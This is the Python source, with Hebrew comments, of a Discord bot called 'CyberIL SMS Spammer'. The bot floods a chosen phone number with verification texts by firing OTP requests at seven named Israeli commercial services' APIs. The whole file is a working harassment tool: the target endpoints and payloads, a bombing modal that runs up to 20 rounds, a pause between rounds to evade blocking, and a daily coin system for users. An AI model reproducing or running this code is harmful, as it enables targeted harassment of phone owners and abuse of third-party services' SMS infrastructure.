import discord
from discord import app_commands
import aiohttp
import asyncio
import os
import time
import logging

# הגדרת לוגים כדי שתוכל לראות הכל ב-Railway Logs
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('CyberIL-Spammer')

# משיכת נתונים מהגדרות המערכת
TOKEN = os.getenv("BOT_TOKEN")
APPLICATION_ID = os.getenv("CLIENT_ID")

class SpammerBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        super().__init__(intents=intents, application_id=APPLICATION_ID)
        self.tree = app_commands.CommandTree(self)
        
        # מסדי נתונים בזיכרון
        self.user_tokens = {}
        self.user_cooldowns = {}
        self.active_attacks = set()

    async def setup_hook(self):
        logger.info("🔄 מסנכרן פקודות סלאש...")
        await self.tree.sync()
        logger.info("✅ הפקודות מוכנות לשימוש!")

bot = SpammerBot()

# ════════════════════════════════════════
#   מנוע ה-API (הספאמר החזק)
# ════════════════════════════════════════

async def send_sms_request(session, url, method, data=None, json=None, headers=None):
    try:
        async with session.request(method, url, data=data, json=json, headers=headers, timeout=5) as resp:
            return resp.status in [200, 201, 204]
    except Exception as e:
        logger.error(f"Error sending to {url}: {e}")
        return False

async def run_bombing_round(phone):
    """פונקציה ששולחת בבת אחת לכל האתרים"""
    async with aiohttp.ClientSession() as session:
        # רשימת המטרות - ה-API החזק שלנו
        targets = [
            {"url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": phone, "type": "phone", "projectId": "1"}},
            {"url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "json": {"phoneNumber": phone}},
            {"url": "https://api.dominos.co.il/sendOtp", "method": "POST", "json": {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}},
            {"url": "https://api.hopon.co.il/v0.15/1/isr/users", "method": "POST", "json": {"clientKey": "11687CA9", "countryCode": "972", "phone": phone}},
            {"url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "method": "POST", "data": f"phone={phone}", "headers": {'Content-Type': 'application/x-www-form-urlencoded'}},
            {"url": "https://pizzahut.co.il/api/v1/auth/otp/send", "method": "POST", "json": {"phone": phone}},
            {"url": "https://api.rebar.co.il/v1/auth/otp", "method": "POST", "json": {"phone": phone}}
        ]
        
        tasks = [send_sms_request(session, **t) for t in targets]
        results = await asyncio.gather(*tasks)
        return sum(1 for r in results if r)

# ════════════════════════════════════════
#   ממשק המשתמש (Modals & Buttons)
# ════════════════════════════════════════

class BombingModal(discord.ui.Modal, title="🚀 CyberIL SMS Launcher"):
    phone = discord.ui.TextInput(
        label="מספר טלפון יעד",
        placeholder="05XXXXXXXX",
        min_length=10,
        max_length=10,
        required=True
    )
    rounds = discord.ui.TextInput(
        label="כמות סיבובים (1-20)",
        default="5",
        min_length=1,
        max_length=2,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value
        try:
            num_rounds = int(self.rounds.value)
        except ValueError:
            num_rounds = 1

        uid = interaction.user.id
        if num_rounds > 20: num_rounds = 20

        await interaction.response.send_message(f"💣 **הפצצה התחילה!**\nמטרה: `{phone_num}`\nסיבובים: `{num_rounds}`", ephemeral=True)
        bot.active_attacks.add(uid)

        for i in range(num_rounds):
            if uid not in bot.active_attacks or bot.user_tokens.get(uid, 0) < 1:
                break
            
            # ביצוע השליחה
            await run_bombing_round(phone_num)
            
            # הורדת מטבע
            bot.user_tokens[uid] -= 1
            
            # המתנה קצרה בין סיבובים למניעת חסימות
            await asyncio.sleep(2.5)

        if uid in bot.active_attacks:
            bot.active_attacks.remove(uid)
        await interaction.followup.send(f"✅ ההפצצה על {phone_num} הסתיימה.", ephemeral=True)

class ControlPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger, custom_id="btn_start")
    async def start_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        tokens = bot.user_tokens.get(interaction.user.id, 0)
        if tokens < 5:
            return await interaction.response.send_message("❌ אין לך מספיק מטבעות! קח טוקן יומי.", ephemeral=True)
        await interaction.response.send_modal(BombingModal())

    @discord.ui.button(label="🎫 טוקן יומי (120)", style=discord.ButtonStyle.success, custom_id="btn_claim")
    async def claim_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        last_claim = bot.user_cooldowns.get(uid, 0)

        if now - last_claim < 86400:
            remaining = int((86400 - (now - last_claim)) // 3600)
            return await interaction.response.send_message(f"⏳ חזור בעוד {remaining} שעות.", ephemeral=True)

        bot.user_tokens[uid] = bot.user_tokens.get(uid, 0) + 120
        bot.user_cooldowns[uid] = now
        await interaction.response.send_message("✅ קיבלת 120 מטבעות! תהנה.", ephemeral=True)

    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
    async def stop_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in bot.active_attacks:
            bot.active_attacks.remove(interaction.user.id)
            await interaction.response.send_message("🛑 התקיפה שלך הופסקה.", ephemeral=True)
        else:
            await interaction.response.send_message("אין תקיפה פעילה כרגע.", ephemeral=True)

# ════════════════════════════════════════
#   פקודות סלאש (/)
# ════════════════════════════════════════

@bot.tree.command(name="setup_spammer", description="פתיחת פאנל ה-SMS")
async def setup_spammer(interaction: discord.Interaction):
    tokens = bot.user_tokens.get(interaction.user.id, 0)
    embed = discord.Embed(
        title="⚡ CyberIL SMS Spammer",
        description=f"ברוך הבא למערכת ה-SMS.\nהיתרה שלך: **{tokens}** מטבעות.",
        color=discord.Color.from_rgb(200, 0, 0)
    )
    embed.add_field(name="📋 הוראות", value="1. קח טוקן יומי\n2. לחץ על התחל\n3. הכנס מספר וסיבובים")
    embed.set_footer(text="CyberIL Team | Secure Spammer")
    await interaction.response.send_message(embed=embed, view=ControlPanelView())

@bot.tree.command(name="give_token", description="הענקת מטבעות למשתמש")
@app_commands.checks.has_permissions(administrator=True)
async def give_token(interaction: discord.Interaction, user: discord.Member, amount: int):
    bot.user_tokens[user.id] = bot.user_tokens.get(user.id, 0) + amount
    await interaction.response.send_message(f"✅ הוספת **{amount}** מטבעות ל-{user.mention}.", ephemeral=True)

@bot.event
async def on_ready():
    logger.info(f"🤖 הבוט באוויר: {bot.user.name}")
    await bot.change_presence(activity=discord.Game(name="/setup_spammer"))

# הפעלה
if __name__ == "__main__":
    if not TOKEN:
        print("❌ שגיאה: לא נמצא BOT_TOKEN בהגדרות המערכת!")
    else:
        bot.run(TOKEN)
